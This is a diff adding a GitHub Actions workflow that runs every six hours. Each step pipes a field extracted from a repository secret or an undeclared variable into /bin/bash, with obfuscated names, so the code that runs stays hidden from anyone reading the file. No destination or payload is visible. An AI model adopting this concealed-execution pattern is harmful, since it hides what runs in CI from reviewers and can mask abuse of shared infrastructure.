@@ -1,0 +1,20 @@
+name: ninglongkongdan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ninglongkongdan
+        env:
+          xh5326: ${{ secrets.xh5326 }}
+        run: |
+          echo $xh5326 | jq -r .o228 | /bin/bash
+          echo $cfgq4 | jq -r .omxba01981 | /bin/bash
+          echo $t39151 | jq -r .uyrf0478 | /bin/bash
+          echo $kftp7564 | jq -r .ouiu44 | /bin/bash
+          echo $ldafw047 | jq -r .t8327 | /bin/bash
+
